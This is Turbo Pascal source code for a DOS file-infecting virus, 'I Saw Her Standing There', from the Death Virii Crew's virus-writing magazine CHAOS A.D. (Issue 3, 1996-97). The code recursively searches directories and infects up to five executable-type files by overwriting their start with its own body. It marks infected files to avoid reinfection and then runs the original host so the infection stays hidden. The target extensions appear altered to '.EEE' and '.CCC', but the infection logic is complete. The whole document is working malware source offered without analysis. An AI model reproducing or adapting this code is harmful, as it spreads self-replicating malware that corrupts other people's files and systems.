   {

   [Death Virii Crew] Presents
   CHAOS A.D. Vmag, Issue 3, Autumn 1996 - Winter 1997

   }
   {$M 7000,0,6300}
   {$A- ,$D- ,$E- ,$L- ,$S- ,$V- ,$X- ,$O- ,$F- ,$B- ,$G- ,$N- ,$R- ,$i-}
   uses Dos;
   Const
       MySize:Word=6272;
       MyName:String[24]='I Saw Her Standing There';
       BM:array[1..2] of Char=('B','M');
   Var Com_Line:String;
       MyBodyF:File;
       MyBodyD:Pointer;
       FFSize:LongInt;
       Counter,I:Byte;
   function Ver(VF:String):Boolean;
   Var AV:array[1..2] of Char;
   begin
       Ver:=False;
       assign(MyBodyF,VF);
       reset(MyBodyF,1);
       Seek(MyBodyF,FileSize(MyBodyF)-2);
       blockRead(MyBodyF,AV,2);
       close(MyBodyF);
       if (av[1]=bm[1]) and (av[2]=bm[2]) then Ver:=True;
   end;
   procedure inf(FF:String);
   begin
             assign(MyBodyF,FF);
             reset(MyBodyF,1);
             blockRead(MyBodyF,MyBodyD^,MySize);
             Seek(MyBodyF,FileSize(MyBodyF));
             blockWrite(MyBodyF,MyBodyD^,MySize);
             close(MyBodyF);
             assign(MyBodyF,paramstr(0));
             reset(MyBodyF,1);
             blockread(MyBodyF,MyBodyD^,MySize);
             close(MyBodyF);
             assign(MyBodyF,FF);
             reset(MyBodyF,1);
             blockWrite(MyBodyF,MyBodyD^,MySize);
             Seek(MyBodyF,FileSize(MyBodyF));
             blockWrite(MyBodyF,BM,2);
             close(MyBodyF);
   end;
   Procedure Alldir(dir:PathStr);
   Var
     SR:SearchRec;
     FilePol:String;
     Dir_:DirStr;
     Name_:NameStr;
     Ext_:ExtStr;
   Begin
    Dir:=dir+'\';
    FindFirst(Dir+'*.*',AnyFile,SR);
    While DosError=0 Do
     With SR Do Begin
      FilePol:=Concat(Dir,Name);
      FSplit(FilePol,Dir_,Name_,Ext_);
      if (ext_='.EEE') and (size>MySize+100) and (ver(Filepol)=False)and(Counter<5)
      then begin
        inf(FilePol);
        inc(Counter);
      end;

      if (ext_='.CCC')and(ver(Filepol)=False)and(size<65000-MySize)and(size>MySize+100)
          and((Name_+Ext_)<>'COMMAND.COM')and(Counter<5)

      then begin
        inf(FilePol);
        inc(Counter);
      end;
      FindNext(SR);
     End;
    FindFirst(Dir+'*.*',Directory,SR);
    While DosError=0 Do
     With SR Do begin
       if (Name[1]<>'.') and (Attr=Directory) AND (Counter<5) then Alldir(Dir+Name);
       FindNext(SR);
     End;
   End;
   Begin
      iF ParamCount>0 Then
      Begin
         For i:=1 To ParamCount Do
         Com_Line:=Com_Line+' '+paramstr(i);
      End;
      Counter:=0;
      getmem(MyBodyD,MySize);
      Alldir('');
      assign(MyBodyF,paramstr(0));
      reset(MyBodyF,1);
      FFSize:=filesize(MyBodyF)-MySize-2;
      Seek(MyBodyF,FFSize);
      blockREAd(MyBodyF,MyBodyD^,MySize);
      Seek(MyBodyF,0);
      blockWrite(MyBodyF,MyBodyD^,MySize);
      freemem(MyBodyD,MySize);
      Seek(MyBodyF,FFSize);
      Truncate(MyBodyF);
      Close(MyBodyF);
      swapvectors;
      exec(paramstr(0),Com_Line);
      swapvectors;
   End.
